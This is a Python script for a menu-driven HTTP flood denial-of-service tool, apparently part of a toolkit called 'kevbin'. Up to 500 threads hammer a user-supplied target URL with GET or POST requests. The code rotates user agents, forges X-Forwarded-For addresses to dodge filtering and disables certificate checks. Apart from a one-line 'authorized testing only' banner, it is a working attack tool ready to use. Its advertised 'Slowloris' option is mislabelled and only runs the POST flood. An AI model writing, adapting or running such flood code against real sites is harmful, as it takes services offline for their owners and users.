"""DDoS Protocol — Layer 7 HTTP flood stress testing."""

import os
import sys
import time
import random
import threading
import urllib.request
import urllib.error
import ssl

try:
    from kevbin import clear, cprint, prompt, pause
except ImportError:
    def clear():
        os.system('cls' if os.name == 'nt' else 'clear')
    def cprint(*a, **kw):
        msg = ' '.join(str(x) for x in a if isinstance(x, str))
        sys.stdout.write(msg + '\n'); sys.stdout.flush()
    def prompt(msg=''):
        if msg: sys.stdout.write(msg); sys.stdout.flush()
        return input()
    def pause():
        prompt('\n  \033[90mPress Enter to continue...\033[0m'); input()

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/605.1.15 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Edge/120.0.0.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36",
]

stop_flag = False
stats = {"ok": 0, "fail": 0, "total_bytes": 0}
lock = threading.Lock()

def _worker(url, method, timeout):
    global stop_flag
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    while not stop_flag:
        try:
            headers = {
                'User-Agent': random.choice(USER_AGENTS),
                'Accept': 'text/html,application/xhtml+xml,*/*',
                'Accept-Language': 'en-US,en;q=0.9',
                'Accept-Encoding': 'gzip, deflate',
                'Connection': 'keep-alive',
                'Cache-Control': 'no-cache',
                'X-Forwarded-For': f'{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}',
            }
            req = urllib.request.Request(url, headers=headers, method=method)
            with urllib.request.urlopen(req, timeout=timeout, context=ctx) as r:
                data = r.read()
                with lock:
                    stats["ok"] += 1
                    stats["total_bytes"] += len(data)
        except Exception:
            with lock:
                stats["fail"] += 1

def run(kevbin=None):
    global stop_flag, stats
    while True:
        clear()
        cprint("  \033[93m╔══════════════════════════════════════════════╗\033[0m")
        cprint("  \033[93m║         DDoS PROTOCOL — LAYER 7             ║\033[0m")
        cprint("  \033[93m╚══════════════════════════════════════════════╝\033[0m")
        cprint("  \033[91m[!] For authorized testing only\033[0m")
        print()
        cprint("  \033[97m[1]  HTTP GET Flood\033[0m")
        cprint("  \033[97m[2]  HTTP POST Flood\033[0m")
        cprint("  \033[97m[3]  Slowloris (slow POST)\033[0m")
        cprint("  \033[91m[0]  Back\033[0m")
        print()
        choice = prompt("\033[33m  choice > \033[0m")
        if choice == '0':
            return
        if choice not in ('1', '2', '3'):
            cprint("  \033[91mInvalid choice\033[0m"); time.sleep(0.5); continue
        clear()
        cprint("  \033[93m┌── CONFIGURATION ────────────────────────────┐\033[0m")
        target = prompt("  \033[96mTarget URL: \033[0m").strip()
        if not target:
            continue
        if not target.startswith('http'):
            target = 'http://' + target
        try:
            threads = int(prompt("  \033[96mThreads (1-500, default 50): \033[0m").strip() or '50')
        except:
            threads = 50
        threads = max(1, min(500, threads))
        try:
            duration = int(prompt("  \033[96mDuration seconds (5-300, default 30): \033[0m").strip() or '30')
        except:
            duration = 30
        duration = max(5, min(300, duration))
        stop_flag = False
        stats = {"ok": 0, "fail": 0, "total_bytes": 0}
        method = 'GET' if choice == '1' else 'POST'
        cprint(f"\n  \033[36m[*] Starting {method} flood: {target}")
        cprint(f"    Threads: {threads} | Duration: {duration}s\033[0m\n")
        t_list = []
        for _ in range(threads):
            t = threading.Thread(target=_worker, args=(target, method, 10), daemon=True)
            t.start()
            t_list.append(t)
        start = time.time()
        try:
            while time.time() - start < duration:
                elapsed = time.time() - start
                pct = int((elapsed / duration) * 100)
                bar_len = 30
                filled = int(bar_len * elapsed / duration)
                bar = "\033[92m" + "\u2588" * filled + "\033[90m" + "\u2591" * (bar_len - filled) + "\033[0m"
                with lock:
                    rps = stats["ok"] / max(elapsed, 0.001)
                    mb = stats["total_bytes"] / (1024 * 1024)
                sys.stdout.write(f"\r  [{bar}] \033[97m{pct:3d}%\033[0m \033[92m{stats['ok']}\033[0m ok \033[91m{stats['fail']}\033[0m fail \033[96m{rps:.0f} req/s\033[0m \033[93m{mb:.1f} MB\033[0m  ")
                sys.stdout.flush()
                time.sleep(0.5)
        except KeyboardInterrupt:
            pass
        stop_flag = True
        time.sleep(1)
        with lock:
            total_ok = stats["ok"]
            total_fail = stats["fail"]
            total_mb = stats["total_bytes"] / (1024 * 1024)
        elapsed = time.time() - start
        rps = total_ok / max(elapsed, 0.001)
        cprint(f"\n\n  \033[92m[X] STRESS TEST COMPLETE\033[0m")
        cprint(f"  \033[97m  Duration:   {elapsed:.1f}s\033[0m")
        cprint(f"  \033[92m  Requests:   {total_ok:,} OK\033[0m")
        cprint(f"  \033[91m  Failed:     {total_fail:,}\033[0m")
        cprint(f"  \033[96m  Avg RPS:    {rps:.0f}\033[0m")
        cprint(f"  \033[93m  Total data: {total_mb:.2f} MB\033[0m")
        pause()
